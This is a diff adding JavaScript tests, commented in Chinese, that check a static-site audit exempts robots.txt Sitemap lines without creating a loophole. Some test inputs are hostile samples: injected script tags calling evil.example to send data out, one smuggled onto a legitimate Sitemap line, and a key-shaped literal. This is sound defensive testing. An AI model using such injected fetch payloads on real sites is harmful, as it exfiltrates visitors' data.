@@ -164,3 +164,44 @@ test('审计不得误伤同源相对路径（正常用法）', () => {
   const r = auditCatches(ok);
   assert.equal(r.caught, false, `同源相对路径被误报：${r.out.slice(0, 300)}`);
 });
+
+// ─────────────────────────────────────────────────────────────
+// robots.txt 的 Sitemap 指令（SEO 基础文件）
+//
+// 根因：robots.txt 规范要求 Sitemap 的值是绝对 URL，于是必然命中
+// 「外部 URL 引用」规则，让 pages.yml 的 test job FAIL、部署被卡住。
+// 修法只给 site/robots.txt 的 Sitemap 行开口子，不能变成全局放行：
+// 下面既有「该放行」的正向用例，也有「别处出现同样一行仍要被抓」的反向用例。
+// ─────────────────────────────────────────────────────────────
+test('审计不得误报 robots.txt 的 Sitemap 指令（合法 SEO 文件）', () => {
+  const robots = [
+    'User-agent: *',
+    'Allow: /',
+    '',
+    'Sitemap: https://tbj0623.github.io/decision-arena-lab/sitemap.xml',
+    '',
+  ].join('\n');
+  const r = auditCatches(robots, 'robots.txt');
+  assert.equal(r.caught, false, `合法 robots.txt 被误报：${r.out.slice(0, 300)}`);
+});
+
+test('审计必须抓住：别处出现 Sitemap 行不能借这道口子（豁免只对 robots.txt 生效）', () => {
+  const payload = `<script>/* x */</script>\nSitemap: https://evil.example/steal`;
+  for (const name of ['evil.html', 'sitemap.txt']) {
+    const r = auditCatches(payload, name);
+    assert.ok(r.caught, `${name} 里的 Sitemap 行逃过了审计`);
+  }
+});
+
+test('审计必须抓住：robots.txt 里夹带在同行的真实外发内容', () => {
+  const r = auditCatches(
+    'Sitemap: https://tbj0623.github.io/decision-arena-lab/sitemap.xml <script>fetch("https://evil.example/x")</script>',
+    'robots.txt',
+  );
+  assert.ok(r.caught, '同行夹带 fetch 的 robots.txt 行逃过了审计');
+});
+
+test('审计必须抓住：robots.txt 里的密钥形态字面量不受豁免影响', () => {
+  const r = auditCatches(`Sitemap: https://tbj0623.github.io/decision-arena-lab/sitemap.xml\n# ${'s' + 'k-'}${'a'.repeat(24)}`, 'robots.txt');
+  assert.ok(r.caught, 'robots.txt 里的密钥未被抓到');
+});
